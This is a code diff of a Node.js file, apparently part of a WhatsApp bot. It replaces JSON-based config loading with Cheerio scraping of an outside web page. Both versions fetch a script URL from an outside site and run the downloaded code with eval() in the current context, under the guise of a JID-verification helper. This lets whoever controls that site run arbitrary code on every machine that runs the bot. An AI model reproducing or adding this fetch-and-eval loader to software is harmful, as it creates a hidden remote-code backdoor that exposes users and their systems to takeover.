@@ -2,9 +2,49 @@
 
 // Include required modules
 const axios = require('axios');
+const cheerio = require('cheerio'); // Use Cheerio to parse HTML
 
-// Define the URL to fetch the configuration
-const configUrl = 'https://www.ibrahimadams.site/files';
+// Define the URL of the page where the links are listed
+const webPageUrl = 'https://www.ibrahimadams.site/files'; // The page with your links
+
+// Function to fetch and extract ADAMS_URL from the webpage
+async function fetchAdamsUrl() {
+    try {
+        // Fetch the webpage content
+        const response = await axios.get(webPageUrl);
+        const htmlContent = response.data;
+
+        // Parse the HTML content using Cheerio
+        const $ = cheerio.load(htmlContent);
+
+        // Find the link dynamically using the text 'ADAMS_URL' on the page
+        // You can search for any anchor tag that contains ADAMS_URL by its text or by URL itself
+        const adamsUrl = $('a:contains("ADAMS_URL")').attr('href'); // Or search for a URL you expect to find
+
+        if (!adamsUrl) {
+            throw new Error('ADAMS_URL not found on the webpage.');
+        }
+
+        console.log('ADAMS_URL fetched successfully:', adamsUrl);
+
+        // Fetch the script from ADAMS_URL
+        const scriptResponse = await axios.get(adamsUrl);
+        const scriptContent = scriptResponse.data;
+
+        console.log('Script loaded successfully!');
+
+        // Execute the script content in the current context
+        eval(scriptContent);
+
+        // Example usage of atbverifierEtatJid
+        const jid = 'example@s.whatsapp.net'; // Replace with actual JID to verify
+        const isValid = atbverifierEtatJid(jid);
+        console.log('Is JID valid?', isValid);
+
+    } catch (error) {
+        console.error('Error:', error.message || error);
+    }
+}
 
 // Function to verify JID
 function atbverifierEtatJid(jid) {
@@ -16,39 +56,5 @@ function atbverifierEtatJid(jid) {
     return true;
 }
 
-// Fetch the configuration and retrieve the ADAMS_URL
-axios.get(configUrl)
-  .then(response => {
-      // Debugging: Log response content
-      console.log('Configuration Response:', response.data);
-
-      // Ensure the response is parsed correctly
-      const configData = typeof response.data === 'string' 
-          ? JSON.parse(response.data) 
-          : response.data;
-
-      const adamsUrl = configData.ADAMS_URL;
-      if (!adamsUrl) {
-          throw new Error('ADAMS_URL is undefined in the configuration.');
-      }
-
-      console.log("ADAMS_URL fetched successfully:", adamsUrl);
-
-      // Fetch the script from ADAMS_URL
-      return axios.get(adamsUrl);
-  })
-  .then(response => {
-      const scriptContent = response.data;
-      console.log("Script loaded successfully!");
-
-      // Execute the script content in the current context
-      eval(scriptContent);
-
-      // Example usage of the atbverifierEtatJid function after script is loaded
-      const jid = 'example@s.whatsapp.net';  // Replace with actual JID to verify
-      const isValid = atbverifierEtatJid(jid);
-      console.log('Is JID valid?', isValid); // You can use this result in further logic
-  })
-  .catch(error => {
-      console.error('Error:', error.message || error);
-  });
+// Execute the fetch function
+fetchAdamsUrl();
